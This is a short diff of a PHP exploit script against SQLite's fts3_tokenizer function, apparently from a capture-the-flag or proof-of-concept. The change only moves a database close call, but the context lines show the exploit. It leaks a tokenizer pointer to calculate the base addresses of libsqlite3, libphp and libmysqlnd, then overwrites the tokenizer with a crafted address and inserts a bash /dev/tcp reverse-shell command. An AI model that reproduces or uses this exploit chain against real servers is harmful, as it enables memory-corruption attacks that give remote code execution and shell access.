@@ -89,13 +89,13 @@ if (isset($_GET['base'])) {
   $db->exec("select fts3_tokenizer('simple', x'$bomb');
     create virtual table a using fts3;
     insert into a values('bash -c \"bash>/dev/tcp/127.1/1337 0<&1\"')");
-  
 } else {
   // step one
   
   $row = $db->query("select hex(fts3_tokenizer('simple')) addr;")->fetchArray();
   $leaked_addr = $row['addr'];
-  
+  $db->close();
+ 
   $addr = hexdec(flip($leaked_addr));
   $libsqlite3_base = $addr - $simpleTokenizerModule;
   $libphp_base = $libsqlite3_base + 0x6234000;
@@ -108,4 +108,3 @@ if (isset($_GET['base'])) {
   die(dechex($libmysqlnd_base));
 }
 
-$db->close();
